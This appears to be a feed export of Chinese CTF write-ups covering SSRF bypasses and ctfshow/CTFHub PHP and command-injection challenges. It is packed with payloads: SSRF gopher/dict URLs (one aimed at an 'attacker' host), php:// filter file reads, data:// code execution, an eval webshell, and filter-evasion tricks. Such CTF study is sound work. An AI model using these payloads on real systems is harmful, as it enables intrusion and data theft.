alt="image-20220415185235060"></p><p>也就是url的参数值必须得含有<code>http://notfound.ctfhub.com</code>，所以这一题应该是绕过</p><p>此处就可以采用@,也就是HTTP基本身份认证绕过</p><p>HTTP基本身份认证允许Web浏览器或者其他客户端程序在请求时提供用户名和口令形式的身份凭证的一种登录验证方式</p><p>也就是：<a href="http://www.xxx.com@www.yy.com的形式/">http://www.xxx.com@www.yy.com的形式</a></p><p>因为这里有特定的网址，所以直接在后面加@+127.0.0.1</p><p>所以直接构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://notfound.ctfhub.com@127.0.0.1/flag.php</span><br></pre></td></tr></table></figure><p>直接得到flag</p><p><img src="https://gitee.com/wu-shuying/drawing-bed/raw/master/images/202204151910736.png" alt="image-20220415191018637"></p><p>总结一下SSRF的绕过方法</p><p>1.攻击本地</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:80</span><br><span class="line">http://localhost:22</span><br></pre></td></tr></table></figure><p>2.利用[::]</p><p>http://[::]:80/ =&gt;<a href="http://127.0.0.1/">http://127.0.0.1</a></p><p>不加端口的话是http://[::]/</p><p>3.利用@</p><p>这里就是在指定的网址后加@+127.0.0.1</p><p>4.利用短域名</p><p><a href="http://dwz.cn/11SMa">http://dwz.cn/11SMa</a> &gt;&gt;&gt; <a href="http://127.0.0.1/">http://127.0.0.1</a></p><p>5.利用特殊域名</p><p>原理是DNS解析</p><p><a href="http://127.0.0.1.xip.io/">http://127.0.0.1.xip.io/</a></p><p><a href="http://www.owasp.org.127.0.0.1.xip.io/">http://www.owasp.org.127.0.0.1.xip.io/</a></p><p>6.利用DNS解析</p><p>在域名上设置A记录，指向127.0.0.1<br>7.利用上传</p><p>修改”type=file”为”type=url”</p><p>比如：上传图片处修改上传，将图片文件修改为URL，即可能触发SSRF</p><p>8.利用句号</p><p>127。0。0。1=&gt;127.0.0.1</p><p>9.进行进制转换</p><p>可以是十六进制，八进制等。<br>115.239.210.26 &gt;&gt;&gt; 16373751032<br>首先把这四段数字给分别转成16进制，结果：73 ef d2 1a<br>然后把 73efd21a 这十六进制一起转换成8进制<br>记得访问的时候加0表示使用八进制(可以是一个0也可以是多个0 跟XSS中多加几个0来绕过过滤一样)，十六进制加0x</p><p>10.利用特殊地址</p><p><a href="http://0.0.0.0/">http://0/</a></p><p>11.利用协议</p><p>Dict://</p><p>dict://@:/d:<br>ssrf.php?url=dict://attacker:11111/</p><p>SFTP://</p><p>ssrf.php?url=s<a href="ftp://example.com:11111/">ftp://example.com:11111/</a></p><p>TFTP://</p><p>ssrf.php?url=t<a href="ftp://example.com:12346/TESTUDPPACKET">ftp://example.com:12346/TESTUDPPACKET</a></p><p>LDAP://</p><p>ssrf.php?url=ldap://localhost:11211/%0astats%0aquit</p><p>Gopher://</p><p>ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%<a href="mailto:&#x33;&#67;&#104;&#x61;&#99;&#107;&#101;&#x72;&#64;&#115;&#x69;&#x74;&#x65;&#x2e;&#99;&#x6f;&#x6d;">&#x33;&#67;&#104;&#x61;&#99;&#107;&#101;&#x72;&#64;&#115;&#x69;&#x74;&#x65;&#x2e;&#99;&#x6f;&#x6d;</a>%3E%250d%250aRCPT%20TO%3A%<a href="mailto:&#x33;&#x43;&#118;&#105;&#99;&#x74;&#105;&#x6d;&#x40;&#x73;&#105;&#116;&#x65;&#x2e;&#99;&#x6f;&#x6d;">&#x33;&#x43;&#118;&#105;&#99;&#x74;&#105;&#x6d;&#x40;&#x73;&#105;&#116;&#x65;&#x2e;&#99;&#x6f;&#x6d;</a>%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%<a href="mailto:&#51;&#x43;&#104;&#97;&#x63;&#107;&#x65;&#x72;&#64;&#x73;&#x69;&#x74;&#x65;&#46;&#x63;&#111;&#x6d;">&#51;&#x43;&#104;&#97;&#x63;&#107;&#x65;&#x72;&#64;&#x73;&#x69;&#x74;&#x65;&#46;&#x63;&#111;&#x6d;</a>%3E%250d%250aTo%3A%20%<a href="mailto:&#x33;&#67;&#x76;&#x69;&#99;&#116;&#105;&#109;&#x65;&#64;&#115;&#105;&#116;&#101;&#46;&#x63;&#x6f;&#109;">&#x33;&#67;&#x76;&#x69;&#99;&#116;&#105;&#109;&#x65;&#64;&#115;&#105;&#116;&#101;&#46;&#x63;&#x6f;&#109;</a>%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a</p>]]></content>
      
      
      <categories>
          
          <category> wp类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -web -ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfhub技能树RCE</title>
      <link href="/2022/03/31/ctfhub%E6%8A%80%E8%83%BD%E6%A0%91RCE/"/>
      <url>/2022/03/31/ctfhub%E6%8A%80%E8%83%BD%E6%A0%91RCE/</url>
      
        <content type="html"><![CDATA[<p>RCE</p><span id="more"></span><h1 id="CTFHub命令注入-过滤cat"><a href="#CTFHub命令注入-过滤cat" class="headerlink" title="CTFHub命令注入-过滤cat"></a>CTFHub命令注入-过滤cat</h1><p>首先先查看源码</p><p><img src="https://gitee.com/wu-shuying/drawing-bed/raw/master/images/202204062057786.png" alt="image-20220406205707623"></p><p>首先看到preg_match_all有三个函数，可以分析一下这三个参数是干嘛的</p><p>运行结果如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; &lt;b&gt;PHP&lt;/b&gt;</span><br><span class="line">    [1] =&gt; &lt;b&gt;Programming Language&lt;/b&gt;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>可以看出输出的结果存在第三个函数中</p><p>同样，exec函数也是如此，运行结果存在$res里面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;pre&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if ($res) &#123;</span><br><span class="line">    print_r($res);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/pre&gt;</span><br></pre></td></tr></table></figure><p>然后输出res，如果没有语句执行，m的变量</p>]]></content>
      
      
      <categories>
          
          <category> wp类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -web -ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfhub技能树RCE</title>
      <link href="/2022/03/31/%E9%80%86%E5%90%91/ctfhub%E6%8A%80%E8%83%BD%E6%A0%91RCE/"/>
      <url>/2022/03/31/%E9%80%86%E5%90%91/ctfhub%E6%8A%80%E8%83%BD%E6%A0%91RCE/</url>
      
        <content type="html"><![CDATA[<p>RCE</p><span id="more"></span><h1 id="CTFHub命令注入-过滤cat"><a href="#CTFHub命令注入-过滤cat" class="headerlink" title="CTFHub命令注入-过滤cat"></a>CTFHub命令注入-过滤cat</h1><p>首先先查看源码</p><p><img src="https://img-blog.csdnimg.cn/img_convert/fb8b5629be08e166ca38341929dc13bf.png" alt="image-20220406205707623"></p><p>首先看到preg_match_all有三个函数，可以分析一下这三个参数是干嘛的</p><p>运行结果如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; &lt;b&gt;PHP&lt;/b&gt;</span><br><span class="line">    [1] =&gt; &lt;b&gt;Programming Language&lt;/b&gt;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>可以看出输出的结果存在第三个函数中</p><p>同样，exec函数也是如此，运行结果存在$res里面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;pre&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if ($res) &#123;</span><br><span class="line">    print_r($res);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/pre&gt;</span><br></pre></td></tr></table></figure><p>然后输出res，如果没有语句执行，m的变量</p>]]></content>
      
      
      <categories>
          
          <category> wp类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -web -ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow中php特性</title>
      <link href="/2022/03/17/ctfshow%E4%B8%ADphp%E7%89%B9%E6%80%A7/"/>
      <url>/2022/03/17/ctfshow%E4%B8%ADphp%E7%89%B9%E6%80%A7/</url>
      
        <content type="html"><![CDATA[<p>php特性</p><span id="more"></span><h1 id="89题"><a href="#89题" class="headerlink" title="89题"></a>89题</h1><p><img src="https://img-blog.csdnimg.cn/img_convert/95d1796aa86eebc60abdf49d129c8607.png" alt="image-20220317200752736"></p><p>本题主要是对数字进行了过滤，并且又要GET请求传入的num变量为数字或数字串，关于preg_match()函数的漏洞：无法处理数组</p><p>payload：<code>/?num[]=1</code></p><h1 id="90题"><a href="#90题" class="headerlink" title="90题"></a>90题</h1><p><img src="https://img-blog.csdnimg.cn/img_convert/2304123756bb9454b095db6d4296868e.png" alt="image-20220317201415842"></p><p>强比较+intval函数</p><p>payload:<code>/?num=4476a</code></p><h1 id="91题"><a href="#91题" class="headerlink" title="91题"></a>91题</h1><p><img src="https://img-blog.csdnimg.cn/img_convert/ed779ba81c140bb32df46a2e5b2f206f.png" alt="image-20220317201750745"></p><p>本题有两个条件，第一个是需要是php，第二个又不可以php，不过有个差距就是m模式，/m代表匹配多行数据，这里可以通过%0a尽行绕过</p><p>payload:<code>?cmd=%0aphp</code></p><h1 id="92题"><a href="#92题" class="headerlink" title="92题"></a>92题</h1><p><img src="https://img-blog.csdnimg.cn/img_convert/1de8816f7c0126eeda38c7f95b6c58e8.png" alt="image-20220317202519500"></p><p>这里的数字不能是4476，但是又必须得是4476，intval可以识别十六进制为十进制</p><p>payload:<code>?num=0x117c</code></p><h1 id="93题"><a href="#93题" class="headerlink" title="93题"></a>93题</h1><p><img src="https://img-blog.csdnimg.cn/img_convert/f0912346e47fc814da302a1103103bb0.png" alt="image-20220317203729715"></p><p>本题ban掉了字母,但是可以使用八进制转换</p><p>payload:<code>?num=010574</code></p><h1 id="94题"><a href="#94题" class="headerlink" title="94题"></a>94题</h1><p><img src="https://img-blog.csdnimg.cn/img_convert/1219681d778d4c44f5676d3390d13e71.png" alt="image-20220317204132238"></p><p><code>strpos()</code>函数用于在字符串内检索一段字符串或一个字符。 如果在字符串中找到匹配,该函数会返回第一个匹配的位置。如果未找到匹配,则返回FALSE（注意字符串位置从0开始，不是从1开始）</p><p>1.对于strpos()函数，我们可以利用换行进行绕过(%a)</p><p>payload：<code>?num=%0a010574</code></p><p>2.不能以0开头了，这时候可以也试试用小数点绕过，intval只识别整数部分</p><p>payload:<code>?num=4476.0001</code></p><p>3.还可以利用八进制绕过(%20是空格的url编码形式)</p><p>payload:<code>?nunm=%20010576</code></p><h1 id="95题"><a href="#95题" class="headerlink" title="95题"></a>95题</h1><p><img src="https://img-blog.csdnimg.cn/img_convert/65029a6234e3826ce93bc2de48e473fb.png" alt="image-20220317211741891"></p><p>intval函数的使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">intval ( mixed $var [, int $base = 10 ] ) : int</span><br><span class="line"></span><br><span class="line">Note:</span><br><span class="line">如果 base 是 0，通过检测 var 的格式来决定使用的进制：</span><br><span class="line">如果字符串包括了 &quot;0x&quot; (或 &quot;0X&quot;) 的前缀，使用 16 进制 (hex)；否则，</span><br><span class="line">如果字符串以 &quot;0&quot; 开始，使用 8 进制(octal)；否则，</span><br><span class="line">将使用 10 进制 (decimal)。</span><br><span class="line">intval(&#x27;4476.0&#x27;)===4476    小数点  </span><br><span class="line">intval(&#x27;+4476.0&#x27;)===4476   正负号</span><br><span class="line">intval(&#x27;4476e0&#x27;)===4476    科学计数法</span><br><span class="line">intval(&#x27;0x117c&#x27;)===4476    16进制</span><br><span class="line">intval(&#x27;010574&#x27;)===4476    8进制</span><br><span class="line">intval(&#x27; 010574&#x27;)===4476   8进制+空格</span><br></pre></td></tr></table></figure><p>本题应该用八进制绕过</p><p>payload:<code>?num=%20010576</code></p><p>payload:<code>?num=+010574</code></p><h1 id="96题"><a href="#96题" class="headerlink" title="96题"></a>96题</h1><p><img src="https://img-blog.csdnimg.cn/img_convert/48e56f83972ec24883e004e6229201ab.png" alt="image-20220317213722011"></p><p>payload:<code>?u=php://filter/read=convert.base64-encode/resource=flag.php</code></p><h1 id="97题"><a href="#97题" class="headerlink" title="97题"></a>97题</h1><p><img src="https://img-blog.csdnimg.cn/img_convert/de52c3940a4b440d653eeb4496d9ca89.png" alt="image-20220321204853794"></p><p>这一题是经典的md5碰撞</p><p><img src="https://img-blog.csdnimg.cn/img_convert/99cb597bac42c05e99e244c2b5eeb9a4.png"></p><p>但是在这里无法实现，所以可以拿数组绕过a[]=1&amp;b[]=2</p><p>直接post</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a[]=1&amp;b[]=2</span><br></pre></td></tr></table></figure><h1 id="98题"><a href="#98题" class="headerlink" title="98题"></a>98题</h1><p><img src="https://img-blog.csdnimg.cn/img_convert/db4aa638ed0350e259608a5f4a0805a7.png" alt="image-20220323191353779"></p><p>本题用到了三元表达式</p><p><img src="https://img-blog.csdnimg.cn/img_convert/0d34b836c85948ada321eca458d9b43c.png" alt="image-20220323192206927"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/7689fb23444c073cbae760bdba0106cd.png" alt="image-20220323192741860"></p><p>第一句话的意思就是如果传入了get参数，就让get的参数等于post的参数</p><p>if($_GET)=&gt;$_GET=$_POST</p><p>第二局如果$_GET[‘flag’]==flag,那么就让get==cookie</p><p>第三句同理</p><p>首先，第一句话肯定是要满足的，满足了之后可以不满足第二句和第三句，直接post，所以payload:<code>get:?a=a post:HTTP_FLAG=flag</code></p><p>第二种解法，第一句第二句满足，第三句不满足payload:<code>get:?a=a post:flag=flag cookie:HTTP_FLAG=flag</code></p><h1 id="99题"><a href="#99题" class="headerlink" title="99题"></a>99题</h1><p><img src="https://img-blog.csdnimg.cn/img_convert/4cad6f9954f62978c5ceb0946da24081.png" alt="image-20220323200657581"></p><p>i从36到0x36d，每次都会选择一个1到i的数随机写入allow数组。所以allow共有841个元素，元素范围是从0~877。然后get传入n，判断是否在allow中，如果在，就把post传入的content传入n这个文件。因为in_array没有第三个参数，所以是弱比较。即1.php也会被判定为1。所以payload<code>get:?n=1.php post:content=&lt;?php eval($_POST[1]); ?&gt;</code></p><h1 id="100题"><a href="#100题" class="headerlink" title="100题"></a>100题</h1><p>因为php中赋值的优先级比运算符要高，所以只是保证v1是数字即可，payload:<code>get:?v1=1&amp;v2=eval($_POST[1])?&gt;&amp;v3=; post:1=system(&#39;tac flag36d.php&#39;);</code></p><p>但是会发现这并不是真正的flag，于是重新查看ctfshow.php，找到了<code>flag_is_8076fcaf0x2d27790x2d49030x2d95e60x2d5f142389996f</code>，把0x等url解码后就是我们的flag</p>]]></content>
      
      
      <categories>
          
          <category> wp类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -web -ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow命令执行</title>
      <link href="/2022/03/12/ctfshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
      <url>/2022/03/12/ctfshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<p>命令执行</p><span id="more"></span><h1 id="29题"><a href="#29题" class="headerlink" title="29题"></a>29题</h1><p><img src="https://img-blog.csdnimg.cn/img_convert/d7f7867af3f1af67f56e8b1fc774c0a9.png" alt="image-20220312140308073"></p><p>本题过滤了flag，直接get<code>?c=system(&quot;cat f*&quot;)</code>;要注意的是括号后面的；一定不能少</p><h1 id="30题"><a href="#30题" class="headerlink" title="30题"></a>30题</h1><p><img src="https://img-blog.csdnimg.cn/img_convert/f8196c63129f02110549db9b86098ae8.png" alt="image-20220312140232958"></p><p>本题过滤了system|flag，用一个代替system()的函数</p><p>命令执行的函数有很多种</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">system()</span><br><span class="line">passthru()</span><br><span class="line">shell_exec()</span><br><span class="line">popen()</span><br><span class="line">porc_open()</span><br><span class="line">pcntl_exec()</span><br><span class="line">反引号 同shell_exec()</span><br></pre></td></tr></table></figure><p>只有system函数是有回显的，其他的函数可以通过echo等显示</p><p>这里可以使用反引号绕过</p><p>1.<code>c=echo&#39;cat f*&#39;;</code></p><p>2.<code>?c=echo &quot;npfs &quot;; include($_GET[&#39;url&#39;]); ?&gt;&amp;url=php://filter/read=convert.base64-encode/resource=flag.php</code></p><p>3.<code>?c=passthru(&quot;cat /f*&quot;);</code></p><h1 id="31题"><a href="#31题" class="headerlink" title="31题"></a>31题</h1><p>过滤了system|cat|flag|空格</p><h2 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt; &lt; &lt;&gt;重定向符</span><br><span class="line">%09(需要php环境)</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$9</span><br><span class="line">&#123;cat,flag.php&#125; //逗号实现了空格的功能</span><br><span class="line">%20</span><br><span class="line">%09</span><br></pre></td></tr></table></figure><h2 id="cat被过滤"><a href="#cat被过滤" class="headerlink" title="cat被过滤"></a>cat被过滤</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">more:一页一页的显示档案内容</span><br><span class="line">less：与more相似</span><br><span class="line">head：查看头几行</span><br><span class="line">tac：从最后一行开始显示，可以看出tac是cat的反向显示</span><br><span class="line">tail：查看尾几行</span><br><span class="line">nl：查看的时候，顺便输出行号</span><br><span class="line">od：以二进制的方式读取档案内容</span><br><span class="line">vi：一种编辑器，这个也可以查看</span><br><span class="line">vim：一种编辑器，这个也可以查看</span><br><span class="line">sort：可以查看</span><br><span class="line">uniq：可以查看</span><br><span class="line">file -f：报错出具体内容</span><br></pre></td></tr></table></figure><p>1.<code>c=echo(tac%09f*);</code></p><p>2.<code>?c=passthru(&quot;more%09f*&quot;);</code></p><p>3.<code>c=include($_GET[&quot;url&quot;]);?&gt;&amp;url=php://filter/read=convert.base64-encode/resource=flag.php</code></p><p>直接单引号改双引号即可</p><h1 id="32题"><a href="#32题" class="headerlink" title="32题"></a>32题</h1><p><img src="https://img-blog.csdnimg.cn/img_convert/c5ff0ecda6f9de57a1a51ce0a679575d.png" alt="image-20220312141347784"></p><p>在31题的基础上又过滤了括号，但是没过滤双引号</p><p><code>?c=include$_GET[&quot;a&quot;]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</code></p><p>base64解码，得到flag</p><p><img src="https://img-blog.csdnimg.cn/img_convert/79383b6fe03fef33a82e74f78190cf52.png" alt="image-20220312142351097"></p><h1 id="33题"><a href="#33题" class="headerlink" title="33题"></a>33题</h1><p><img src="https://img-blog.csdnimg.cn/img_convert/1a1274e84aa2e1f3b8266c4db1748733.png" alt="image-20220312142624368"></p><p>在前面的基础上又过滤了双引号</p><p>1.<code>?c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</code></p><p>2.``?c=include $_POST[a]?&gt;<code>  1=php://filter/read=convert.base64-encode/resource=flag.php</code></p><p>base64解码得到flag</p><h1 id="34题"><a href="#34题" class="headerlink" title="34题"></a>34题</h1><p><img src="https://img-blog.csdnimg.cn/img_convert/46e86af8f00677b9251fff3df9926746.png" alt="image-20220312143300880"></p><p>在上面的基础上又多过滤了一个分号，但是不起什么作用</p><p>解法还是同33题</p><h1 id="35题"><a href="#35题" class="headerlink" title="35题"></a>35题</h1><p><img src="https://img-blog.csdnimg.cn/img_convert/f7859ac8882ebec896b07427f2ea648f.png" alt="image-20220312143907450"></p><p>多过滤了一个&lt;，没什么用</p><p>同33题</p><h1 id="36题"><a href="#36题" class="headerlink" title="36题"></a>36题</h1><p><img src="https://img-blog.csdnimg.cn/img_convert/a828d9b98ebeeac502b88b17421eac35.png" alt="image-20220312145258685"></p><p>在前面几题的基础上过滤了数字，但是解法跟33题一样</p><h1 id="37题"><a href="#37题" class="headerlink" title="37题"></a>37题</h1><p><img src="https://img-blog.csdnimg.cn/img_convert/036433c2cd80b28f849b63381fbca926.png" alt="image-20220312145223510"></p><p>本题使用了PHP文件包含函数include()，利用伪协议读取flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data://,类似php://input,可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流就会被当作php文件执行</span><br></pre></td></tr></table></figure><p>flag.php可以通过通配符绕过</p><p>POC：<code>?c=data://text/plain,&lt;?php system(&quot;cat f*&quot;);</code></p><h1 id="38题"><a href="#38题" class="headerlink" title="38题"></a>38题</h1><p><img src="https://img-blog.csdnimg.cn/img_convert/5e4df7aaaa8c6664231ca60a91335494.png" alt="image-20220312150746965"></p><p>在37题的基础上过滤了php，利用base64编码绕过</p><p><code>?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs=</code></p><p>PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs=的意思是&lt;?php system(“cat flag.php”)</p><h1 id="39题"><a href="#39题" class="headerlink" title="39题"></a>39题</h1><p>本题没有有过滤php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=data://text/plain&lt;?php system(&quot;cat f*&quot;);?&gt;</span><br></pre></td></tr></table></figure><h1 id="40题"><a href="#40题" class="headerlink" title="40题"></a>40题</h1><p><img src="https://img-blog.csdnimg.cn/img_convert/695aace9dff7213274ab12d962043276.png" alt="image-20220312152859983"></p><p>过滤了引号，$,：，还不能用php伪协议</p><p>一般的括号里面都要用引号，所以这里可以试着用一下无参数RCE(remote command/code execute)</p><p>无参数的意思是a(),a(b()),a(b(c())),但是不能是a(‘b’)或者a(‘b’,’c’)，不能带参数</p><p>1.print_r(scandir(‘.’));查看当前目录下的所有文件名</p><p>2.localeconv()函数返回一包含本地数字及货币格式信息的数组</p><p>3.current()函数返回数组中的当前元素(单位)，默认去第一个值，和post()一样，但是这题过滤了引号，不能有参数，找一个代替<code>&#39;.&#39;</code>的东西</p><p>print_r(scandir(current(localeconv())));打印出</p><p>当前目录下文件</p><p>flag.php在倒数第二个，我们可以通过array_reverse进行逆转数组，然后用next()函数进行下一个值的读取，直接用next(array_reverse());</p><p>payload: <code>?c=show_source(next(array_reverse(scandir(current(localeconv())))));</code></p><h1 id="41题"><a href="#41题" class="headerlink" title="41题"></a>41题</h1><p>unsloved</p><p>42题</p><p><img src="https://img-blog.csdnimg.cn/img_convert/c4a53b300e09a81326166959d1932e11.png" alt="image-20220312162511799"></p><p><strong>&gt;/dev/null 2&gt;&amp;1</strong>主要意思是不进行回显的意思</p><p>我们想让命令回显，那么进行命令分隔即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">;   //分号</span><br><span class="line">|//只执行后面那条命令</span><br><span class="line">||//只执行前面那条命令</span><br><span class="line">&amp;//两条命令都会执行</span><br><span class="line">&amp;&amp;//两条命令都会执行</span><br></pre></td></tr></table></figure><p>1.<code>?c=ls;</code></p><p>2.<code>?c=cat flag.php;</code></p><p>3.<code>?c=cat flag.php||</code></p><h1 id="43题"><a href="#43题" class="headerlink" title="43题"></a>43题</h1><p><img src="https://img-blog.csdnimg.cn/img_convert/cbec4f22f0a435e6266a2cb53e761cf0.png" alt="image-20220312163310834"></p><p>过滤了;|cat</p><p>1.<code>?c=ls%0a</code></p><p>2.<code>?c=more flag.php%0a</code></p><p>3.?c=sort flag.php||</p><h1 id="44题"><a href="#44题" class="headerlink" title="44题"></a>44题</h1><p><img src="https://img-blog.csdnimg.cn/img_convert/cad28692588a2f85ed63d749c1fd49e8.png" alt="image-20220312171705422"></p><p>过滤了;|cat|flag</p><p><code>?c=ls%0a</code></p><p><code>?c=more f*%0a</code></p><p>通配符也可以绕过</p><p>?c=sort%20fl*||</p><h1 id="45题"><a href="#45题" class="headerlink" title="45题"></a>45题</h1><p><img src="https://img-blog.csdnimg.cn/img_convert/8e845ebfb011fdf8e0792fd048dcf2bb.png" alt="image-20220312171542457"></p><p>过滤了;|cat|flag|空格</p><p><code>?c=ls%0a</code></p><p><code>?c=more$&#123;IFS&#125;f*%0a</code></p><h1 id="46题"><a href="#46题" class="headerlink" title="46题"></a>46题</h1><p><img src="https://img-blog.csdnimg.cn/img_convert/66df0a38cde713606edb91b89eece003.png" alt="image-20220312171412627"></p><p>过滤了;|cat|flag|空格|数字|$|*</p><p><code>?c=ls%0a</code></p><p><code>?c=more%09fla?.php%0a</code>(这里的%09是空格不是数字)</p><h1 id="47题"><a href="#47题" class="headerlink" title="47题"></a>47题</h1><p><img src="https://img-blog.csdnimg.cn/img_convert/530b0b79e9a32c2f1e90e22ab6237cb1.png" alt="image-20220312171323162"></p><p>过滤了;|cat|flag|空格|数字|$|*|几个查看文件的命令</p><p><code>?c=ls%0a</code></p><p><code>?c=nl%09fla?.php%0a</code></p><h1 id="48题"><a href="#48题" class="headerlink" title="48题"></a>48题</h1><p><img src="https://img-blog.csdnimg.cn/img_convert/34e2a14f2346e5546b477ee92e9453c7.png" alt="image-20220312172509277"></p><p>同47</p><h1 id="49题"><a href="#49题" class="headerlink" title="49题"></a>49题</h1><p><img src="https://img-blog.csdnimg.cn/img_convert/9156a486d2e16f88f3184407a995f01d.png" alt="image-20220312172617146"></p><p>同47</p><h1 id="50题"><a href="#50题" class="headerlink" title="50题"></a>50题</h1><p><img src="https://img-blog.csdnimg.cn/img_convert/6b66eac7e7682517d7336c35c208ac62.png" alt="image-20220312172745788"></p><p>过滤了;|cat|flag|空格|数字|$|*|几个查看文件的命令|%</p><p>&lt;&gt;和？一起使用时没有回显，所以这里的？可以用反斜杠进行代替</p><p>1.<code>?c=ls%0a</code></p><p>2.<code>?c=nl&lt;&gt;fla\g.php%0a</code></p><p>3.?c=tac&lt;&gt;fla\g.php||</p><h1 id="51题"><a href="#51题" class="headerlink" title="51题"></a>51题</h1><p><img src="https://img-blog.csdnimg.cn/img_convert/49a7a9e9ecd4e0262ba1237b8d981374.png" alt="image-20220312174632727"></p><p>%0a是换行，同样可以进行命令分隔；tac被过滤，换nl</p><p>?c=nl&lt;&gt;fla\g.php%0a</p><h1 id="52题"><a href="#52题" class="headerlink" title="52题"></a>52题</h1><p><img src="https://img-blog.csdnimg.cn/img_convert/5e009f969b222f72ba2456af3f460255.png" alt="image-20220315210801979"></p><p><code>?c=nl$&#123;IFS&#125;fla\g.php%0a</code></p><p><img src="https://img-blog.csdnimg.cn/img_convert/d62b84e7327ff6d32c9b98f6a6816e67.png" alt="image-20220315205648002"></p><p>发现是假的，直接连接一下根目录，发现有flag</p><p><img src="https://img-blog.csdnimg.cn/img_convert/2e3df2cbe08590424c7fc113566c1d28.png" alt="image-20220315205846765"></p><p>所以直接抓flag <code>?c=nl$&#123;IFS&#125;/fla\g%0a</code><img src="https://img-blog.csdnimg.cn/img_convert/25389f7df75615ec01c09621065b9d81.png" alt="image-20220315210356796"></p><h1 id="53题"><a href="#53题" class="headerlink" title="53题"></a>53题</h1><p><img src="https://img-blog.csdnimg.cn/img_convert/2a0c0764816a1756834f6a9adf4d6046.png" alt="image-20220315210928431"></p><p><code>?c=nl$&#123;IFS&#125;fla\g.php</code></p><h1 id="54题"><a href="#54题" class="headerlink" title="54题"></a>54题</h1><p><img 